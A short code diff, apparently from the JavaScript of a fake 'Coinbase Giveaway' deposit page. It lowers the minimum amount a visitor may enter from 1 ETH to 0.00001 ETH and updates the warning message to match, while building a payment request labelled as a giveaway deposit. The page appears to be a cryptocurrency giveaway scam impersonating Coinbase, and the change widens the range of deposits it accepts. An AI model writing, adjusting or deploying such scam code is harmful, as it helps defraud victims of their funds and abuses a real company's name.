@@ -181,7 +181,7 @@ function update_trans() {
       }, 1e4))
   }),
   $('#gen-btn').click(() => {
-    if ($('#cal-in').val() >= 1 && $('#cal-in').val() <= 500) {
+    if ($('#cal-in').val() >= 0.00001 && $('#cal-in').val() <= 500) {
       amount_entered = $('#cal-in').val()
       tm = Date.now()
       $('#gen-amount').text(amount_entered)
@@ -204,7 +204,7 @@ function update_trans() {
             '&message=Deposit+to+Coinbase+Giveaway+' +
             tm,
         )
-    } else $('#warn').text('Amount should be within 1 ETH to 500 ETH')
+    } else $('#warn').text('Amount should be within 0.00001 ETH to 500 ETH')
   }),
   $('#close').click(() => {
     $('.pop-body').css('display', 'none')
